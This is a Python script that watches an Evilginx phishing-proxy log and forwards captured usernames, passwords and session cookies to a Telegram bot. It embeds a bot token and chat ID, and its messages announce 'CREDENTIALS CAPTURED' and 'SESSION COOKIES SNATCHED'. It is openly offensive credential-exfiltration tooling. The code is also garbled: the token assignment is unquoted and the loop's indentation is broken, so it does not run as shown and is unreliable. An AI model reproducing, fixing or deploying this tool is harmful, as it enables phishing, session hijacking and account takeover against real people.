import time
import re
import requests
from pathlib import Path

# === CONFIGURATION - MUST SET THESE VALUES ===
TELEGRAM_TOKEN = 8280681542:AAHEzQdxJXEINECD6lszV-k8E4lmmXx5iRc
CHAT_ID = 5624411599      # Get via IDBot or getUpdates
LOG_FILE = Path("/PATH/TO/YOUR/evilginx.log")   # Evilginx log path
CHECK_INTERVAL = 3  # Seconds between checks

# Optimized regex patterns (fixed syntax)
CREDS_PATTERN = re.compile(r"(?:username|login|email|j_username|user)\s*[=:]\s*['\"]?([^'\"\s]+)", re.I)
PASS_PATTERN = re.compile(r"(?:password|pass|j_password|pwd|secret)\s*[=:]\s*['\"]?([^'\"\s]+)", re.I)
COOKIE_PATTERN = re.compile(r"([^\s=]+)\s*=\s*([^;]+);", re.I)

last_pos = 0  # Track file read position

def send_telegram(msg):
    """Send formatted message to Telegram with error handling"""
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": msg,
        "parse_mode": "Markdown",
        "disable_web_page_preview": True
    }
    try:
        requests.post(url, json=payload, timeout=10)
    except Exception as e:
        print(f"[-] Telegram send failed: {str(e)}")

print("[*] Starting Evilginx Telegram Sniffer - Waiting for credentials...")
send_telegram("```🔒 Evilginx Telegram sniffer ONLINE\nMonitoring: " + str(LOG_FILE) + "```")

while True:
    try:
        # Verify log file exists
        if not LOG_FILE.exists():
            time.sleep(CHECK_INTERVAL)
            continue
        
        # Read new lines since last check
        with LOG_FILE.open("r", encoding="utf-8", errors="ignore") as f:
            f.seek(last_pos)
            new_lines = f.readlines()
            last_pos = f.tell()
        
        # Process each new log entry
for line in new_lines:
            line = line.strip()
            if not line:
                continue
            
            # Detect credentials
            u_match = CREDS_PATTERN.search(line)
            p_match = PASS_PATTERN.search(line)
            if u_match and p_match:
   username = u_match.group(1)
password = p_match.group(1)
   # Truncate long values
                user_disp = username[:50] + "..." if len(username) > 50 else username
  pass_disp = password[:50] + "..." if len(password) > 50 else password
  msg = f"🚨 **CREDENTIALS CAPTURED**\nUser: `{user_disp}`\nPass: `{pass_disp}`"
                send_telegram(msg)
                print(f"[+] Credentials sent: {username[:15]}...")
        
            # Detect cookies
            cookies = COOKIE_PATTERN.findall(line)
            if cookies:
                cookie_str = "\n".join([f"{k.strip()}: {v.strip()}" for k,v in cookies])
    msg = f"🍪 **SESSION COOKIES SNATCHED**\n```\n{cookie_str[:1000]}\n```"# Truncate huge outputs
  send_telegram(msg)
print(f"[+] Cookies sent: {len(cookies)} captured")
    
    except KeyboardInterrupt:
        print("\n[!] Stopped by user")
        send_telegram("`⛔ Sniffer manually stopped`")
        break
    except Exception as e:
        print(f"[-] Error: {str(e)}")
        time.sleep(5)  # Prevent spam on persistent errors
    
    time.sleep(CHECK_INTERVAL)